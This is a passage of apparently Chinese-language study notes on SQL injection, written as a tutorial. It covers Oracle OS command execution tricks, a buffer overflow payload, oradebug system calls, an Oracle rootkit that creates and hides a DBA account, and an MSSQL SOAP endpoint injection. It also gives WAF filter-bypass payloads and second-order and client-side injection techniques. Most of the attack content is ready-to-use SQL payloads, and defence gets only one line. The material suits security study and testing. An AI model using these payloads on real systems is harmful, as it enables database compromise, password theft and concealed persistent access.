<span class="token keyword">select</span> token_text <span class="token keyword">from</span> DR$USER_FILTER_IDX$I<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p><code>Alter System set 事件</code></p>
<p>Alter System set是一种非公开参数(自Oracle 10g以来)，它可以指定自定义调试器的名称。 在调试事件(debugging event)过程中将执行自定义的调试器，而调试事件则需予以强制实现。 例如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> system <span class="token keyword">set</span> <span class="token string">"_oradbg_pathname"</span><span class="token operator">=</span><span class="token string">'/tmp/debug.sh'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p><code>PL/SQL native 9i</code></p>
<p>自9iR2以来，Oracle提供了将PL/SQL代码转换成C代码的方法。为提高灵活性，Oracle 可以修改make工具的名称(例如，修改成calc.exe或其他可执行文件)。例如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> system <span class="token keyword">set</span> plsql_native_make_utility<span class="token operator">=</span><span class="token string">'cmd.exe /c echo Owned &gt; c:\ rds.txt &amp;'</span><span class="token punctuation">;</span>
<span class="token keyword">alter</span> <span class="token keyword">session</span> <span class="token keyword">set</span> plsql_compiler_flags<span class="token operator">=</span><span class="token string">'NATIVE'</span><span class="token punctuation">;</span>
<span class="token keyword">Create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> <span class="token keyword">procedure</span> rds <span class="token keyword">as</span> <span class="token keyword">begin</span> <span class="token boolean">null</span><span class="token punctuation">;</span> <span class="token keyword">end</span><span class="token punctuation">;</span> <span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>缓冲区溢出</p>
<p>2004 年，Cesar Cerrudo 公布 了关于 Oracle 中 NUMTOYMINTERVA 和 NUMTODSINTERVAL 这两个函数的一种缓冲区溢出漏洞，使用下列漏洞在数据库服务器上运行操作系统命令：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> NUMTOYMINTERVAL <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDEFGHIJKLMNOPQR'</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">141</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">148</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">172</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">148</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">01</span><span class="token punctuation">)</span><span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'echo ARE YOU SURE? &gt;c:\Unbreakable.txt'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>自定义应用代码</p>
<p>在Oracle领域，我们经常使用包含操作系统命令的表，这些命令由连接到数据库的外部程序执行。使用指定的命令更新数据库中这样的条目时，我们经常可以控制系统。检查所有表以寻找包含操作系统命令的列，将命令注入到命令表，等待被执行。</p>
</li>
</ul>
<h5 id="以SYSDBA执行代码"><a href="#以SYSDBA执行代码" class="headerlink" title="以SYSDBA执行代码"></a>以SYSDBA执行代码</h5><p>对于具有SYSDBA权限(比如SYS)的用户来说，使用oradebug(9i R2、10g R2、11g R1或11g R2)调用任意的操作系统命令或DLL/库。以下命令中的空格字符必须使用tab字符来代替：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlplus	sys<span class="token operator">/</span>pw<span class="token variable">@dbserver</span>	<span class="token keyword">as</span>	sysdba
<span class="token keyword">SQL</span><span class="token operator">&gt;</span>oradebug	setmypid
<span class="token keyword">SQL</span><span class="token operator">&gt;</span>oradebug	<span class="token keyword">call</span>	system	<span class="token string">"/bin/touch	-f	/home/oracle/rds.txt"</span><span class="token keyword">Function</span>	returned	<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="PostgreSQL-5"><a href="#PostgreSQL-5" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>执行操作系统命令的方式就是调用用户自定义函数(User-Defined Function, UDF)</p>
<p>对于存在于本地操作系统之上的共享库，库中将没有magic block声明。我们必须上传具有该声明的我们自己的共享库。在PostgreSQL中，可以将UDF放在PostgreSQL用户具有读/ 写访问权限的任何位置。在Linux/UNIX系统中通常位于/tmp目录，在Windows系统中通常位 于 c:\windows\temp 目录。</p>
<p>要包含magic block,在已经包含了头文件fmgr.h之外，还需要在源文件的其中一个模块(仅能有一个模块)中包含下面的指令：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># ifdef PG_MODULE_MAGIC</span>
PG_MODULE_MAGIC<span class="token punctuation">;</span>
<span class="token comment"># endif</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="巩固访问"><a href="#巩固访问" class="headerlink" title="巩固访问"></a>巩固访问</h3><p>Oracle rookkit</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- the following code must run as DBA</span>
<span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">grant</span> dba <span class="token keyword">to</span> hidden identified <span class="token keyword">by</span> hidden_2009<span class="token punctuation">;</span>
<span class="token comment">-- create a user hidden with DBA privileges</span>
<span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> sys<span class="token punctuation">.</span>kupp$<span class="token keyword">proc</span><span class="token punctuation">.</span>disable_multiprocess <span class="token keyword">from</span> dual<span class="token punctuation">;</span> 
<span class="token comment">-- this SELECT statement is needed for newer version of Oracle (10.2.0.5,11.1.0.7, 11.2.0.x) to activate the identity change</span>
<span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">exec</span> sys<span class="token punctuation">.</span>kupp$<span class="token keyword">proc</span><span class="token punctuation">.</span>change_user<span class="token punctuation">(</span><span class="token string">'SYS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">-- become user SYS </span>
<span class="token comment">-- change the users record in sys.user$</span>
<span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">update</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">set</span> tempts<span class="token comment">#=666 where name='HIDDEN';</span>
<span class="token comment">-- does not show the user HIDDEN</span>
<span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">select</span> username <span class="token keyword">from</span> dba_users<span class="token punctuation">;</span>
<span class="token comment">-- but the connect works</span>
<span class="token keyword">SQL</span><span class="token operator">&gt;</span> <span class="token keyword">connect</span> hidden<span class="token operator">/</span>hidden_2009

<span class="token comment">#Oracle使用ALL_USERS和DBA_USERS视图来显示用户列表，这些视图包含了三张表的并集。通过将tempts#(或datats#或type#)设置成不存在的值，可以从并集结果和视图中清除用户：</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FORCE</span> <span class="token keyword">VIEW</span> <span class="token string">"SYS"</span><span class="token punctuation">.</span><span class="token string">"ALL—USERS"</span> <span class="token punctuation">(</span><span class="token string">"USERNAME"</span><span class="token punctuation">,</span><span class="token string">"USER_ID"</span><span class="token punctuation">,</span><span class="token string">"CREATED"</span><span class="token punctuation">)</span> <span class="token keyword">AS</span>
<span class="token keyword">select</span> u<span class="token punctuation">.</span>name<span class="token punctuation">,</span> u<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token comment">#, u.ctime</span>
<span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ u<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>ts$ dts<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>ts$ tts
<span class="token keyword">where</span> u<span class="token punctuation">.</span>datats<span class="token comment"># = dts.ts#</span>
<span class="token operator">and</span> u<span class="token punctuation">.</span>tempts<span class="token comment"># = tts.ts#</span>
<span class="token operator">and</span> u<span class="token punctuation">.</span><span class="token keyword">type</span><span class="token comment"># = 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过http.sys(管理IIS的同一内核组件)暴露基于SOAP(简单对象访问协议)的Web服务，使用T-SQL命令启用端点上的批处理时，端点会隐式暴露另一种名为sqlbatch的SOAP 方法。sqlbatch方法可以通过SOAP来执行T-SQL语句。</p>
<p>我们可以发出请求来创建需要的SOAP 端点：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token string">' exec('</span><span class="token keyword">CREATE</span> ENDPOINT ep2 STATE<span class="token operator">=</span>STARTED <span class="token keyword">AS</span> HTTP <span class="token punctuation">(</span>AUTHENTICATION <span class="token operator">=</span> <span class="token punctuation">(</span>INTEGRATED<span class="token punctuation">)</span><span class="token punctuation">,</span>PATH <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">/</span>sp<span class="token string">''</span><span class="token punctuation">,</span>PORTS<span class="token operator">=</span><span class="token punctuation">(</span>CLEAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">FOR</span> SOAP <span class="token punctuation">(</span>BATCHES<span class="token operator">=</span>ENABLED<span class="token punctuation">)</span>'<span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上述代码在victim服务器的/sp目录中创建了一个SOAP端点，我们可以在该端点上瞄准 一个SOAP请求（使用嵌入式SQL查询）。</p>
<h2 id="高级话题"><a href="#高级话题" class="headerlink" title="高级话题"></a>高级话题</h2><h3 id="避开输入过滤器"><a href="#避开输入过滤器" class="headerlink" title="避开输入过滤器"></a>避开输入过滤器</h3><p>Web应用防火墙（WAF）或入侵防御系统（IPS）</p>
<p>通常会过滤SQL关键词，如select，insert，and等、还有特定字符，如单引号，连接字符、还有空白符</p>
<h4 id="使用大小写变种绕过"><a href="#使用大小写变种绕过" class="headerlink" title="使用大小写变种绕过"></a>使用大小写变种绕过</h4><p>数据库不区分大小写</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'uNiOn SeLeCt password FrOm tblUsers WhErE username='' admin'</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="使用SQL注释"><a href="#使用SQL注释" class="headerlink" title="使用SQL注释"></a>使用SQL注释</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#过滤器</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'FROM '</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr <span class="token punctuation">(</span>Svalue<span class="token punctuation">,</span> <span class="token string">'UPDATE '</span><span class="token punctuation">)</span> <span class="token operator">||</span>
stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'WHERE '</span><span class="token punctuation">)</span><span class="token operator">||</span>
stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'ALTER '</span><span class="token punctuation">)</span><span class="token operator">||</span>
stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SELECT '</span><span class="token punctuation">)</span><span class="token operator">||</span>
stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SHUTDOWN '</span><span class="token punctuation">)</span> <span class="token operator">||</span>
stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'CREATE '</span><span class="token punctuation">)</span> <span class="token operator">||</span>
stristr <span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'DROP '</span><span class="token punctuation">)</span> <span class="token operator">||</span>
stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'DELETE FROM '</span><span class="token punctuation">)</span><span class="token operator">||</span>
stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'script '</span><span class="token punctuation">)</span><span class="token operator">||</span>
stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span><span class="token string">'&lt;&gt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span>stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span> <span class="token operator">||</span>
stristr<span class="token punctuation">(</span>$<span class="token keyword">value</span><span class="token punctuation">,</span> <span class="token string">'SET '</span><span class="token punctuation">)</span><span class="token punctuation">)</span> die <span class="token punctuation">(</span><span class="token string">'Please provide a permitted value for'</span><span class="token punctuation">.</span>$<span class="token keyword">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对关键字后面跟着的空格检测，使用/**/充当分隔符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'/**/UNION/**/SELECT/**/password/**/FROM/**/tblUsers/**/WHERE/**/username/**/LIKE/**/'</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Mysql中能使用内联注释来避开关键字绕过，sel/**/ect</p>
<h4 id="使用URL编码"><a href="#使用URL编码" class="headerlink" title="使用URL编码"></a>使用URL编码</h4><p>过滤器能过滤空白符和内联注释序列/*，将序列双URL编码，即对%编码得到%25</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/tblUsers%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/'</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也能使用Unicode编码</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/ada02281ca6c2ec5917209ee31ddf0fe.png"></p>
<p><img src="https://images.dadream.eu.org/images/2024/07/53fabfd7b23b29dcc9b7671b125d1d16.png"></p>
<h4 id="使用动态查询执行"><a href="#使用动态查询执行" class="headerlink" title="使用动态查询执行"></a>使用动态查询执行</h4><p>过滤器阻止了想注入的查询，那么可以使用动态执行来避开该过滤器。</p>
<ul>
<li><p>mssql</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token string">'SELECT password FROM tblUsers'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>oracle</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> pw VARCHAR2<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'SELECT password FROM tblUsers'</span> <span class="token keyword">INTO</span> pw<span class="token punctuation">;</span>
DBMS_OUTPUT<span class="token punctuation">.</span>PUT_LINE<span class="token punctuation">(</span>pw<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p>使用字符串操作函数将过滤器允许的输入转换成一个包含所需查询的字符串</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Oracle: <span class="token string">'SEL'</span><span class="token operator">||</span><span class="token string">'ECT'</span>
MS<span class="token operator">-</span><span class="token keyword">SQL</span>: <span class="token string">'SEL'</span><span class="token operator">+</span><span class="token string">'ECT'</span>
MySQL: <span class="token string">'SEL'</span> <span class="token string">'ECT'</span>
<span class="token comment">#URL中分别将它们编码成％2b(+)和％20( )</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>oracle使用chr()，ms-sql使用char()，还能用来绕过引号</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Oracle中的REVERSE、TRANSLATE、REPLACE 和SUBSTR函数。</p>
<p>ms-sql，使用16进制实例化字符串</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@query</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
<span class="token keyword">SELECT</span> <span class="token variable">@query</span> <span class="token operator">=</span> <span class="token number">0x53454c4543542070617373776f72642046524f4d2074626c5573657273</span> <span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token variable">@query</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="使用空字节"><a href="#使用空字节" class="headerlink" title="使用空字节"></a>使用空字节</h4><p>空字节之所以能起作用，是因为原生代码(native code)和托管代码分别采用不同的方法来处理空字节。在原生代码中，根据字符串起始位置到出现第一个空字节的位置来确定字符串长度 (空字节有效终止了字符串)。而在托管代码中，字符串对象包含一个字符数组(可能包含空字节) 和一条单独的字符串长度记录。</p>
<p>要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节 (%00)即可。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">%</span><span class="token number">00</span><span class="token string">'UNION SELECT password FROM tblUsers WHERE username= '</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="嵌套剥离后的表达式（双字绕过）"><a href="#嵌套剥离后的表达式（双字绕过）" class="headerlink" title="嵌套剥离后的表达式（双字绕过）"></a>嵌套剥离后的表达式（双字绕过）</h4><p>有些审查过滤器会先从用户输入中剥离特定的字符或表达式，然后再按照常用的方式处理剩下的数据。如果被剥离的表达式中包含两个或多个字符，就不会递归应用过滤器。</p>
<p>如果从输入中剥离了 SQL关键词SELECT</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SELSELECTECT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="利用截断"><a href="#利用截断" class="headerlink" title="利用截断"></a>利用截断</h4><p>审查过滤器通常会对用户提供的数据执行多种操作，有时这些操作中会包括将输入截断成最大的长度(可能是为了尽力阻止缓冲区溢出攻击)或者调整数据使其位于拥有预定义最大长度的数据库字段内。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#条件：对引号标记进行双重编码，使用两个单引号(")替换所有的单引号(')，将每一项截断成16个字符</span>
<span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin"-- '</span><span class="token operator">AND</span> password <span class="token operator">=</span><span class="token string">''</span>
<span class="token comment">#执行不成功</span>
<span class="token comment">#利用上述条件，注入15个a和一个单引号</span>
<span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'aaaaaaaaaaaaaaa'' AND password =''
#第三个单引号干扰了语法，后面无效
'</span>
<span class="token comment">#利用第二个注入点闭合单引号，并注入永真条件</span>
<span class="token keyword">SELECT</span> uid <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'aaaaaaaaaaaaaaa'' AND password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="避开自定义过滤器"><a href="#避开自定义过滤器" class="headerlink" title="避开自定义过滤器"></a>避开自定义过滤器</h4><p>遇到各种奇怪绝妙的输入过滤器，可以通过发挥想象力来避开这些过滤器。</p>
<p>例如，包名加双引号，编码替换，加标签</p>
<h4 id="使用非标准入口点"><a href="#使用非标准入口点" class="headerlink" title="使用非标准入口点"></a>使用非标准入口点</h4><p>通常WAF不会验证参数名，可以注入SQL代码到参数名中，如果参数名被处理成SQL查询就能执行，同理，也能注入到HTTP头中等等</p>
<h3 id="利用二阶SQL注入"><a href="#利用二阶SQL注入" class="headerlink" title="利用二阶SQL注入"></a>利用二阶SQL注入</h3><ol>
<li><p>攻击者在HTTP请求中提交某种经过构思的输入。</p>
</li>
<li><p>应用程序存储该输入(通常保存在数据库中)以便后面使用并响应请求。</p>
</li>
<li><p>攻击者提交第二个(不同的)请求。</p>
</li>
<li><p>为处理第二个请求，应用程序会检索己经存储的输入并处理，从而导致攻击者注入的 SQL查询被执行。</p>
</li>
<li><p>如果可行的话，会在应用程序对第二个请求的响应中向攻击者返回查询结果。</p>
</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">a<span class="token string">'+@@version+'</span>a
<span class="token comment">#注入这个参数值，经过处理得到</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tblContacts <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'a''+@@version+''a'</span><span class="token punctuation">,</span><span class="token string">'foo@example.org,....
'</span>
<span class="token comment">#单引号被转化为双引号</span>

<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tblUsers <span class="token keyword">WHERE</span> contactld <span class="token operator">=</span> <span class="token number">123</span>
<span class="token comment">#检索已存在的细节信息</span>
<span class="token keyword">UPDATE</span> tblUsers
<span class="token keyword">SET</span> name<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">+</span>@<span class="token variable">@version</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">,</span>address<span class="token operator">=</span><span class="token string">'52 Throwley Way'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">WHERE</span> contactld <span class="token operator">=</span> <span class="token number">123</span>
<span class="token comment">#使用上面测试过的字符串注入引号双重编码</span>

<span class="token comment">#当查看更新后的信息时，@@version就会执行显示在屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="寻找二阶漏洞"><a href="#寻找二阶漏洞" class="headerlink" title="寻找二阶漏洞"></a>寻找二阶漏洞</h4><ol>
<li><p>在筹划好应用程序的内容和功能后进行复查，寻找所有用户能够控制的数据项，这些数据项会被应用程序持久保存并被后面的功能重用。单独操作每个数据项并为每个实例执行接下来的步骤。</p>
</li>
<li><p>在数据项中提交一个简单的值，数据项在SQL查询中被不安全地使用时很可能会引发问题，例如，单引号或者使用单引号引起来的字母数字型字符串。如有必要，请快速检查所有包含多个阶段的过程（比如用户注册）以保证数据值完全持久地存在于应用程序中。</p>
</li>
<li><p>如果发现应用程序的输入过滤器阻止了输入，绕过</p>
</li>
<li><p>快速检查应用程序中所有存在显式使用数据项的功能以及可能存在隐式使用数据项的功能。寻找所有能够表明是由输入引发了问题的异常行为，比如数据库错误消息、HTTP 500 状态代码、更隐秘的错误消息、受损的功能、丢失或毁坏的数据等。</p>
</li>
<li><p>对于识别出来的每个潜在问题，尝试开发一种概念验证攻击来确认是否存在SQL注入漏洞。请注意，有缺陷的持久数据可能以间接受到攻击的方式（例如，整型转换错误或后续数据验证失败）来引发异常条件。使用两个引号标识来提供相同的输入并查看异常是否消失。 使用数据库专用的结构（比如字符串连接函数和版本标识）来确认正在修改SQL查询。如果异常条件是盲的（例如，不返回查询结果或任何错误消息），使用时间延迟技术来确认漏洞的存在。</p>
</li>
</ol>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>对所有可变数据项使用参数化，白名单</p>
<h3 id="客户端SQL注入漏洞"><a href="#客户端SQL注入漏洞" class="headerlink" title="客户端SQL注入漏洞"></a>客户端SQL注入漏洞</h3><h4 id="访问本地数据库"><a href="#访问本地数据库" class="headerlink" title="访问本地数据库"></a>访问本地数据库</h4><p>为了更快的加载数据，以及离线使用，有时会把数据库放在本地</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//JavaScript创建一个本地数据库</span>
<span class="token keyword">var</span> database <span class="token operator">=</span> <span class="token function">openDatabase</span><span class="token punctuation">(</span><span class="token string">"dbStatus"</span><span class="token punctuation">,</span> <span class="token string">"1.0"</span><span class="token punctuation">,</span> <span class="token string">"Status updates"</span><span class="token punctuation">,</span><span class="token number">500000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">tx</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
tx<span class="token punctuation">.</span><span class="token function">executeSql</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS tblUpdates (id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, date VARCHAR(20), user VARCHAR(50), status VARCHAR(IOO))"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
tx<span class="token punctuation">.</span><span class="token function">executeSql</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO tblUpdates (date, user, status) VALUES ('1/8/2012','Me','I am writing a book.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="攻击客户端数据库"><a href="#攻击客户端数据库" class="headerlink" title="攻击客户端数据库"></a>攻击客户端数据库</h4><p>要发送客户端SQL注入攻击，攻击者必须识别出一些他能控制的数据片段，并且应用程序以非安全方式将这些数据片段存储在其他用户的客户端数据库中。</p>
<p>如果这些客户端数据库存在同步，能到达其他数据库执行，则可以注入SQL查询</p>
<p>场景</p>
<p>在社交网络应用程序中，在Web邮件应用程序中，在实现拍卖功能的应用程序中，攻击者可以控制的基于文本的数据，在屏幕上输入的但是受到输入验证程序支配的数据</p>
